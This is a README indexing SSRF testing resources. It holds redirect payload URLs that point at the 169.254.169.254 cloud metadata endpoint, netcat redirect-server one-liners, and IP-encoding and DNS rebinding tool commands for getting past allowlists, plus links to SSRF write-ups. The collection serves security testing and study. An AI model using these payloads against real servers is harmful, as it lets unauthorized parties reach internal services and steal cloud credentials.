# SSRF(Server Side Request Forgery) testing resources

***

### htaccess - redirect test for various cases
Status codes: 300, 301, 302, 303, 305, 307, 308

Filetypes: jpg, json, csv, xml
#### Live demo:
jpg 301 response without and with a valid response body:

`https://ssrf.localdomain.pw/img-without-body/301-http-169.254.169.254:80-.i.jpg`

`https://ssrf.localdomain.pw/img-without-body-md/301-http-.i.jpg`

`https://ssrf.localdomain.pw/img-with-body/301-http-169.254.169.254:80-.i.jpg`

`https://ssrf.localdomain.pw/img-with-body-md/301-http-.i.jpg`


json 301 response without and with a valid response body:

`https://ssrf.localdomain.pw/json-without-body/301-http-169.254.169.254:80-.j.json`

`https://ssrf.localdomain.pw/json-without-body-md/301-http-.j.json`

`https://ssrf.localdomain.pw/json-with-body/301-http-169.254.169.254:80-.j.json`

`https://ssrf.localdomain.pw/json-with-body-md/301-http-.j.json`


csv 301 response without and with a valid response body:

`https://ssrf.localdomain.pw/csv-without-body/301-http-169.254.169.254:80-.c.csv`

`https://ssrf.localdomain.pw/csv-without-body-md/301-http-.c.csv`

`https://ssrf.localdomain.pw/csv-with-body/301-http-169.254.169.254:80-.c.csv`

`https://ssrf.localdomain.pw/csv-with-body-md/301-http-.c.csv`


xml 301 response without and with a valid response body:

`https://ssrf.localdomain.pw/xml-without-body/301-http-169.254.169.254:80-.x.xml`

`https://ssrf.localdomain.pw/xml-without-body-md/301-http-.x.xml`

`https://ssrf.localdomain.pw/xml-with-body/301-http-169.254.169.254:80-.x.xml`

`https://ssrf.localdomain.pw/xml-with-body-md/301-http-.x.xml`

***

### custom-30x - Custom 30x responses and Location header with PHP

#### Live demo:

`https://ssrf.localdomain.pw/custom-30x/?code=332&url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json`

***

### custom-200 - Custom 200 response and Content-Location header with PHP

#### Live demo:

`https://ssrf.localdomain.pw/custom-200/?url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json`

***

### custom-201 - Custom 201 response and Location header with PHP

#### Live demo:

`https://ssrf.localdomain.pw/custom-201/?url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json`

***

### Minimal web server using netcat

`while true ; do nc -l -p 80 -c 'echo -e "HTTP/1.1 302 Found\nContent-Type: application/json\nLocation: http://169.254.169.254/\n{\"a\":\"b\"}"'; done`

`while true ; do nc -l -p 554 -c 'echo -e "RTSP/1.0 301 Moved\nCSeq: 1\nLocation: http://169.254.169.254/"'; done`

***

### ip.py - Alternate IP encoding tool useful for SSRF Testing

python ip.py IP PORT WhiteListedDomain EXPORT(optional)

python ip.py 169.254.169.254 80 www.google.com

python ip.py 169.254.169.254 80 www.google.com export

***

### DNS pinning

nslookup ssrf-169.254.169.254.localdomain.pw

***

### DNS pinning race condition

nslookup ssrf-race-169.254.169.254.localdomain.pw

***

### DNS Rebinding

pip install twised

python dns.py WhitelistedIP InternalIP Port

python dns.py 216.58.214.206 169.254.169.254 53

http://webcache.googleusercontent.com/search?q=cache:http://www.611eternity.com/DNSRebinding%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/

***

### cloud-metadata.txt - Cloud Metadata Dictionary useful for SSRF Testing

***

### svg - SSRF with svg files

***

### ffmpeg - SSRF with ffmpeg

https://hackerone.com/reports/237381

https://hackerone.com/reports/243470

https://github.com/neex/ffmpeg-avi-m3u-xbin

https://www.blackhat.com/docs/us-16/materials/us-16-Ermishkin-Viral-Video-Exploiting-Ssrf-In-Video-Converters.pdf

https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit#slide=id.g22371f2702_0_15

***

### iframe - SSRF with html iframe + URL bypass

#### Live demo:

`http://ssrf.localdomain.pw/iframe/?proto=http&ip=127.0.0.1&port=80&url=/`

***

### Java/Python FTP Injections Allow for Firewall Bypass

http://webcache.googleusercontent.com/search?q=cache:http://blog.blindspotsecurity.com/2017/02/advisory-javapython-ftp-injections.html

http://webcache.googleusercontent.com/search?q=cache:https://shiftordie.de/blog/2017/02/18/smtp-over-xxe/

***

### SSRF + Gopher + Redis

http://webcache.googleusercontent.com/search?q=cache:http://vinc.top/2016/11/24/%E3%80%90ssrf%E3%80%91ssrfgopher%E6%90%9E%E5%AE%9A%E5%86%85%E7%BD%91%E6%9C%AA%E6%8E%88%E6%9D%83redis/

https://webcache.googleusercontent.com/search?q=cache:http://antirez.com/news/96

***

### Top 5 features that are often prone to SSRF vulnerabilities:

https://webcache.googleusercontent.com/search?q=cache:https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF

***

### AppSecEU15-Server_side_browsing_considered_harmful.pdf
https://www.youtube.com/watch?v=8t5-A4ASTIU

***

### us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf

***

### SSRF Tips
http://webcache.googleusercontent.com/search?q=cache:http://blog.safebuff.com/2016/07/03/SSRF-Tips/

***

### SSRF bible
https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM

***
